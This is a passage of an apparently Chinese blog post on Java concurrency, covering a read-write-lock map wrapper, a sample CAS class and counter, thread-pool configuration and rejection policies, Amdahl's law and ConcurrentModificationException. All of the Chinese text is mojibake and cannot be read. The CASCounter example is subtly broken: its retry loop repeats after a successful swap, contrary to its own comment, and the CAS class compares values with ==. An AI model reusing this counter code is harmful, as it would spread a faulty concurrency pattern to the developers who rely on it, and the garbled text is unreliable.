class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteMap</span> &lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;K, V&gt; map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReadWriteLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Lock</span> <span class="variable">r</span> <span class="operator">=</span> lock.readLock();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Lock</span> <span class="variable">w</span> <span class="operator">=</span> lock.writeLock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReadWriteMap</span><span class="params">(Map&lt;K, V&gt; map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        w.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> map.put(key, value);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            w.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        r.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> map.get(key);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ... </span><br><span class="line">    <span class="comment">// remove/putAll/clear/size/isEmpty/containsKey/containsValue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="åŸå­å˜é‡"><a href="#åŸå­å˜é‡" class="headerlink" title="åŸå­å˜é‡"></a>åŸå­å˜é‡</h4><p>åœ¨<code>java.util.concurrent.atomic</code>åŒ…ä¸­æä¾›äº†å¤§é‡åŸå­å˜é‡ç±»ï¼ŒåŸå­ç±»åº•å±‚é‡‡ç”¨CASï¼ˆCompare-and-Swapï¼‰æ–¹å¼ã€‚CASåœ¨ç«äº‰å¤±è´¥æ—¶ä¼šå†è¯•è€ŒåŸºäºé”ä¿æŠ¤çš„æ“ä½œåœ¨è·å–é”å¤±è´¥æ—¶çº¿ç¨‹å°†ä¼šè¢«æŒ‚èµ·ï¼Œåœ¨ç«äº‰ä¸æ¿€çƒˆç¯å¢ƒä¸‹å¤±è´¥é‡è¯•èƒ½é¿å…çº¿ç¨‹æŒ‚èµ·è€Œè·å¾—ä¸é”™çš„æ€§èƒ½ï¼Œåœ¨ç«äº‰æ¿€çƒˆæ—¶CASæ“ä½œä¼šé¢‘ç¹å¤±è´¥é‡è¯•ã€‚</p><p>CASï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CAS çš„å…¸å‹ä½¿ç”¨æ¨¡å¼æ˜¯ï¼šé¦–å…ˆä» V ä¸­è¯»å–å€¼ A ï¼Œå¹¶æ ¹æ® A è®¡ç®—æ–°å€¼ B ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åå†é€šè¿‡ CAS ä»¥åŸå­æ–¹å¼å°† V ä¸­çš„å€¼ç”± A å˜æˆ B ï¼ˆåªè¦åœ¨è¿™æœŸé—´æ²¡æœ‰ä»»ä½•çº¿ç¨‹å°† V çš„å€¼ä¿®æ”¹ä¸ºå…¶ä»–å€¼ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> * ç”±äº CAS èƒ½æ£€æµ‹åˆ°æ¥è‡ªå…¶ä»–çº¿ç¨‹çš„å¹²æ‰°ï¼Œå› æ­¤å³ä½¿ä¸ä½¿ç”¨é”ä¹Ÿèƒ½å¤Ÿå®ç°åŸå­çš„è¯»ä¸€æ”¹ä¸€å†™æ“ä½œåºåˆ—ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CAS</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CAS</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ¯”è¾ƒæˆåŠŸåˆ™æ¢å€¼</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * å¯¹äº i = 1; i = i + 1</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬çš„é¢„æœŸæ˜¯1ï¼Œæ“ä½œååº”è¯¥ç»“æœæ˜¯2ï¼›</span></span><br><span class="line"><span class="comment">     * å¦‚æœæ­¤æ—¶iç¡®å®æ˜¯1ï¼Œé‚£å°±è¯´æ˜æ²¡äººä¿®æ”¹ï¼Œé‚£å°±ç›´æ¥å°†é¢„æœŸç»“æœ2èµ‹å€¼ç»™å®ƒã€‚</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expectedValue æœŸæœ›å€¼ï¼Œå³æˆ‘ä»¬çœ‹åˆ°çš„å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newValue      æ–°å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> T <span class="title function_">compareAndSwap</span><span class="params">(T expectedValue, T newValue)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">oldValue</span> <span class="operator">=</span> value;</span><br><span class="line">        <span class="keyword">if</span> (value == expectedValue)</span><br><span class="line">            value = newValue;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> #compareAndSwap(int, int)&#125; è¿”å›çš„æ˜¯æ—§å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœŸæœ›çš„é‚£ä¸ªå€¼çš„ã€‚</span></span><br><span class="line"><span class="comment">     * &lt;br&gt;</span></span><br><span class="line"><span class="comment">     * å¦‚æœå®ƒçš„è¿”å›å€¼å’Œæˆ‘ä»¬çš„æœŸæœ›å€¼ä¸€æ ·ï¼Œè¯´æ˜æ­¤æ—¶äº¤æ¢æˆåŠŸäº†ã€‚</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expectedValue æœŸæœ›å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newValue      æ–°å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">compareAndSet</span><span class="params">(T expectedValue, T newValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (expectedValue == compareAndSwap(expectedValue, newValue));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CASCounter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> CAS&lt;Integer&gt; value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CASCounter</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = <span class="keyword">new</span> <span class="title class_">CAS</span>&lt;&gt;(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            v = value.get();</span><br><span class="line">            <span class="comment">// ç›¸ç­‰è¡¨ç¤ºæ›¿æ¢æˆåŠŸï¼Œå¤±è´¥åˆ™é‡è¯•</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (v == value.compareAndSwap(v, v + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> v + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h3><ul><li><p>ThreadPoolExecutor</p><ul><li>corePoolSize åˆå§‹çº¿ç¨‹æ± å¤§å°</li><li>maximumPoolSize æœ€å¤§çº¿ç¨‹æ± å¤§å°</li><li>keepAliveTime ä¸æ´»åŠ¨çº¿ç¨‹å­˜æ´»æ—¶é—´</li><li>workQueue ä»»åŠ¡ç¼“å†²é˜Ÿåˆ—</li><li>threadFactory åˆ›å»ºå·¥ä½œçº¿ç¨‹çš„å·¥å‚ï¼Œç‰¹æ®Šæƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦å®šåˆ¶æˆ‘ä»¬çš„å·¥ä½œçº¿ç¨‹ã€‚</li></ul><p>  å·¥ä½œçº¿ç¨‹æ»¡äº†åæ–°ä»»åŠ¡å¯ä»¥æ”¾åˆ°é˜Ÿåˆ—ä¸­ï¼Œé˜Ÿåˆ—åˆ†ä¸ºæœ‰ç•Œé˜Ÿåˆ—å’Œæ— ç•Œã€‚ä½¿ç”¨æ— ç•Œé˜Ÿåˆ—åœ¨å·¥ä½œçº¿ç¨‹å¤„ç†ä¸åŠæ—¶æ—¶å¯èƒ½ä¼šå‡ºç°æ’é˜Ÿä»»åŠ¡å¤ªå¤šï¼Œå†…å­˜æº¢å‡ºæƒ…å†µã€‚</p><p>  ä½¿ç”¨æœ‰ç•Œé˜Ÿåˆ—æ—¶ï¼Œå¦‚æœé˜Ÿåˆ—æ»¡äº†ä»¥åæœ‰ä¸åŒçš„<code>é¥±å’Œç­–ç•¥</code>æ¥å¤„ç†ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ThreadPoolExecutor</span> <span class="variable">executorService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">60</span>, TimeUnit.SECONDS, <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;Runnable&gt;(<span class="number">5</span>));</span><br><span class="line"><span class="comment">// é¥±å’Œç­–ç•¥</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardPolicy());</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardOldestPolicy());</span></span><br><span class="line"><span class="comment">//executorService.setRejectedExecutionHandler(new ThreadPoolExecutor.AbortPolicy());</span></span><br><span class="line">executorService.setRejectedExecutionHandler(<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">    Thread.sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">task</span> <span class="operator">=</span> i;</span><br><span class="line">    System.out.printf(<span class="string">&quot;put task %d\n&quot;</span>, task);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        executorService.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                System.out.printf(<span class="string">&quot;run task: %d; thread: %s \n&quot;</span>, task, Thread.currentThread().getName());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(e.getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;put fail %d [%s]\n&quot;</span>, task, e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newFixedThreadPool</p><p>  å¤§å°å›ºå®šçš„çº¿ç¨‹æ± ã€‚æ³¨æ„<code>LinkedBlockingQueue</code>æ˜¯æ— ç•Œçš„ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newFixedThreadPool</span><span class="params">(<span class="type">int</span> nThreads)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads,</span><br><span class="line">                                    <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newCachedThreadPool    </p><p>  å¯ç¼“å­˜çš„çº¿ç¨‹æ± ï¼Œä¼šå›æ”¶ç©ºé—²çš„çº¿ç¨‹ã€‚æ³¨æ„ï¼šè¿™ç§æ–¹å¼åˆ›å»ºçš„çº¿ç¨‹æ± <code>maximumPoolSize</code>ä¸º<code>Integer.MAX_VALUE</code>ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newCachedThreadPool</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                    <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newSingleThreadExecutor   </p><p>  åˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹çº¿ç¨‹</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newSingleThreadExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FinalizableDelegatedExecutorService</span></span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>newScheduledThreadPool   </p><p>  åˆ›å»ºä¸€ä¸ªå¯å®šæ—¶åŠå‘¨æœŸæ€§ä»»åŠ¡æ‰§è¡Œä»»åŠ¡çš„çº¿ç¨‹æ± ã€‚æ³¨æ„ï¼šçº¿ç¨‹æ± å¤§å°ä¸º<code>Integer.MAX_VALUE</code>ã€‚</p></li><li><p>newWorkStealingPool </p><p>  è¿™ä¸ªçº¿ç¨‹æ± æ˜¯1.8å¼•å…¥çš„ã€‚è¯¥çº¿ç¨‹æ± ä½¿ç”¨<code>ForkJoinPool</code>å®ç°ï¼Œå‚æ•°<code>parallelism</code>ä¸ºçº¿ç¨‹çš„å¹¶è¡Œæ•°é‡å…¶ç»§æ‰¿è‡ª<code>AbstractExecutorService</code>ã€‚<code>ForkJoinPool</code>å®ç°äº†ä¸€ä¸ª<code>å·¥ä½œçªƒå–</code>ç®—æ³•ï¼Œä½¿å¾—ç©ºé—²çº¿ç¨‹èƒ½å¤Ÿçªƒå–åˆ«çš„çº¿ç¨‹åˆ†è§£å‡ºæ¥çš„å­ä»»åŠ¡ï¼Œä»è€Œè®©æ‰€æœ‰çš„çº¿ç¨‹éƒ½å°½å¯èƒ½å¤„äºæ»¡è´Ÿè·ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡ã€‚æœ‰ä¸€ä¸ªæ— å‚æ•°ç‰ˆæœ¬ï¼Œå…¶å°†<code>parallelism</code>è®¾ä¸º<code>Runtime.getRuntime().availableProcessors()</code>,å³å¤„ç†å™¨æ ¸æ•°ã€‚</p></li><li><p>ForkJoinPool</p><p>  TODO</p></li></ul><h4 id="é¥±å’Œç­–ç•¥"><a href="#é¥±å’Œç­–ç•¥" class="headerlink" title="é¥±å’Œç­–ç•¥"></a>é¥±å’Œç­–ç•¥</h4><ul><li><p>Abort </p><p>  é»˜è®¤ç­–ç•¥ç›´æ¥æ‹’ç»æ–°ä»»åŠ¡ï¼ŒæŠ›å‡º<code>RejectedExecutionException</code>å¼‚å¸¸ã€‚</p></li><li><p>Discard</p><p>  æ‚„æ‚„çš„ä¸¢å¼ƒæœ€æ–°çš„ä»»åŠ¡ï¼Œä¸ä¼šæœ‰ä»»ä½•å¼‚å¸¸æŠ›å‡ºã€‚</p></li><li><p>DiscardOld </p><p>  åŒ<code>Discard</code>æ°æ°ç›¸åï¼Œæ‚„æ‚„çš„æŠ›å¼ƒæœ€æ—§çš„å¾…æ‰§è¡Œä»»åŠ¡ã€‚</p></li><li><p>CallerRuns</p><p>  åŠä¸æŠ›å¼ƒï¼Œä¹Ÿä¸ä¼šæŠ›å¼‚å¸¸ã€‚çº¿ç¨‹æ± å’Œé˜Ÿåˆ—éƒ½æ»¡æ—¶ä¼šåœ¨è°ƒç”¨äº†<code>execute</code>çš„çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œè¿™ç§æƒ…å†µä¸»çº¿ç¨‹å¯èƒ½ä¼šè¢«é˜»å¡ã€‚</p></li></ul><h4 id="çº¿ç¨‹æ± åœæ­¢"><a href="#çº¿ç¨‹æ± åœæ­¢" class="headerlink" title="çº¿ç¨‹æ± åœæ­¢"></a>çº¿ç¨‹æ± åœæ­¢</h4><ul><li><p>shutdown </p><p>  éé˜»å¡æ–¹æ³•ã€‚åœæ­¢çº¿ç¨‹ï¼Œä¼šç­‰å¾…æ‰€æœ‰å·¥ä½œåŠæ’é˜Ÿçº¿ç¨‹éƒ½æ‰§è¡Œå®Œæ¯•ã€‚</p></li><li><p>shutdownNow</p><p>  éé˜»å¡ã€‚å…ˆåœæ­¢ï¼ˆ<code>interrupt</code>ï¼‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ï¼Œç„¶åè¿”å›æ­£åœ¨ç­‰å¾…çš„ä»»åŠ¡ã€‚é€šè¿‡æ£€æµ‹<code>Thread.currentThread().isInterrupted()</code>é€‚æ—¶ç»“æŸæ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ã€‚</p></li><li><p>awaitTermination(timeout, unit)</p><p>  é˜»å¡ç­‰å¾…æœ€é•¿<code>timeout</code>ç­‰å¾…çº¿ç¨‹æ± ç»“æŸã€‚</p></li></ul><h3 id="Amdahlå®šå¾‹"><a href="#Amdahlå®šå¾‹" class="headerlink" title="Amdahlå®šå¾‹"></a>Amdahlå®šå¾‹</h3><p>åœ¨æœ‰äº›é—®é¢˜ä¸­ï¼Œå¦‚æœå¯ç”¨èµ„æºè¶Šå¤šé‚£ä¹ˆè§£å†³é—®é¢˜çš„é€Ÿåº¦å°±è¶Šå¿«ã€‚å¯ç”¨èµ„æºä¸é€Ÿåº¦æ˜¯ä¸€ä¸ªä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿæˆ‘ä»¬å¢åŠ äº†10å€æœºå™¨èƒ½è·å¾—æ€§å‡ å€çš„æå‡å‘¢ï¼ŸAmdahlå®šå¾‹æè¿°çš„æ­£æ˜¯è¿™ä¸ªé—®é¢˜ã€‚</p><p>åœ¨å¢åŠ è®¡ç®—èµ„æºçš„æƒ…å†µä¸‹ï¼Œç¨‹åºç†è®ºä¸Šèƒ½å®ç°çš„æœ€é«˜åŠ é€Ÿæ¯”ï¼Œè¿™ä¸ªå€¼å–å†³äºç¨‹åºä¸­ç§‘å¹¶è¡Œç»„ä»¶ä¸ä¸²è¡Œç»„ä»¶æ‰€å çš„æ¯”é‡ã€‚å‡è®¾Fæ˜¯å¿…é¡»è¢«ä¸²è¡Œæ‰§è¡Œçš„éƒ¨åˆ†ï¼Œé‚£ä¹ˆæ ¹æ®Amdahlå®šå¾‹ï¼Œåœ¨åŒ…å«Nä¸ªå¤„ç†å™¨çš„æœºå™¨ä¸­ï¼Œæœ€é«˜çš„åŠ é€Ÿæ¯”ä¸ºï¼š<br><img src="/images/amdahl.png"><br>å½“Nè¶‹è¿‘æ— ç©·å¤§æ—¶ï¼Œæœ€å¤§çš„åŠ é€Ÿæ¯”è¶‹è¿‘1&#x2F;Fã€‚å› æ­¤å¦‚æœç¨‹åºä¸­å¦‚æœæœ‰50%çš„è®¡ç®—éœ€è¦ä¸²è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆæœ€é«˜çš„åŠ é€Ÿæ¯”åªèƒ½æ˜¯2ï¼ˆä¸ç®¡æœ‰å¤šå°‘ä¸ªå¤„ç†å™¨å¤šå°‘ä¸ªçº¿ç¨‹å¯ç”¨ï¼‰ã€‚å¦‚æœç¨‹åºä¸­æœ‰10%çš„è®¡ç®—éœ€è¦ä¸²è¡Œï¼Œé‚£ä¹ˆæœ€é«˜çš„åŠ é€Ÿæ¯”å°†æ¥è¿‘10ã€‚</p><p>Amdahlå®šå¾‹çš„åº”ç”¨åœºæ™¯ï¼š</p><p>åœ¨ä¸€ä¸ªè®¢å•å¤„ç†ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬åº”ç”¨æœåŠ¡å™¨å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ‰©å±•å¾ˆå¤šå€ã€‚é‚£ä¹ˆåœ¨æ•°æ®åº“ä¸­å¹¶å‘æ‰£å‡åº“å­˜è¿™ä¸ªç‚¹å°±æ˜¯æ•´ä¸ªç³»ç»Ÿçš„ä¸²è¡Œç‚¹ï¼Œè¿™ä¸ªç‚¹ç›´æ¥å†³å®šäº†æ•´ä¸ªç³»ç»Ÿæœ€ç»ˆçš„ååé‡ã€‚é‡åˆ°è¿™ç§é—®é¢˜ï¼Œæˆ‘ä»¬ç›²ç›®å †æœºå™¨åˆæœŸèƒ½æé«˜ååé‡ï¼Œå¢åŠ åˆ°ä¸€å®šç¨‹åº¦æ€§èƒ½å°†ä¸å†æå‡ï¼Œè€Œä¸”è¿˜ä¼šå› ä¸ºçº¿ç¨‹ç«äº‰æ¿€çƒˆé€ æˆæ€§èƒ½ä¸‹é™ã€‚</p><h3 id="å¸¸è§å¼‚å¸¸"><a href="#å¸¸è§å¼‚å¸¸" class="headerlink" title="å¸¸è§å¼‚å¸¸"></a>å¸¸è§å¼‚å¸¸</h3><ul><li><p>java.util.ConcurrentModificationException</p><p>  å¯¹å®¹å™¨è¿­ä»£çš„æ—¶å€™å¦‚æœåŒæ—¶å¯¹å…¶è¿›è¡Œä¿®å°±ä¼šæŠ›å‡º<code>ConcurrentModificationException</code>ã€‚è¿™ç±»ä¼¼ä¸€ç§<strong>é¢„è­¦æœºåˆ¶</strong>ï¼Œå®ƒå°†è®¡æ•°å™¨ä¸å®¹å™¨å˜åŒ–å…³è”ã€‚å¦‚æœè¿­ä»£æœŸé—´è®¡æ•°å™¨è¢«ä¿®æ”¹é‚£ä¹ˆ<code>hasNext</code>æˆ–è€…<code>next</code>å°†æŠ›å‡ºå¼‚å¸¸ã€‚åœ¨è¿­ä»£æœŸé—´è¿­ä»£å™¨å¯èƒ½å¹¶æ²¡æœ‰æ„è¯†åˆ°å®¹å™¨å·²ç»ä¿®æ”¹äº†ï¼Œè¿™æ˜¯ä¸€ç§æƒè¡¡æœºåˆ¶æ¥å°½é‡é¿å…å¹¶å‘ä¿®æ”¹æ“ä½œå¯¹ç¨‹åºçš„å½±å“ã€‚</p><p>  <code>modCount</code>æ˜¯Listçš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œè¡¨ç¤ºå®¹å™¨ä¿®æ”¹(add&#x2F;remove)æ¬¡æ•°ã€‚<br>  <code>expectedModCount</code>æ˜¯<code>Iterator</code>å†…éƒ¨å˜é‡ï¼Œè¿™ä¸ªå€¼çš„åˆå§‹å€¼å°±æ˜¯<code>modCount</code>çš„å€¼ã€‚å¦‚æœè¿­ä»£è¿‡ç¨‹ä¸­ä¿®æ”¹äº†å®¹å™¨ï¼Œ<code>modCount</code>å°±ä¼šæ”¹å˜ï¼Œè€Œæ­¤æ—¶<code>expectedModCount</code>è¿˜æ˜¯<code>modCount</code>çš„æ—§å€¼ã€‚    </p><blockquote><p>ä¸ç®¡æ˜¯ç®€å•çš„forï¼Œè¿˜æ˜¯å¢å¼ºforå¾ªç¯ç¼–è¯‘åéƒ½æ˜¯Iteratorè¿­ä»£ã€‚<br>ç›´æ¥è°ƒç”¨<code>Iterator.remove</code>æ¥åˆ é™¤å…ƒç´ ä¸ä¼šå‡ºç°<code>ConcurrentModificationException</code>å¼‚å¸¸ï¼Œå…¶æ–¹æ³•å†…éƒ¨ä¼šé‡æ–°ä¿®æ­£<code>modCount</code>å’Œ<code>expectedModCount</code>çš„å€¼ã€‚</p></blockquote>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 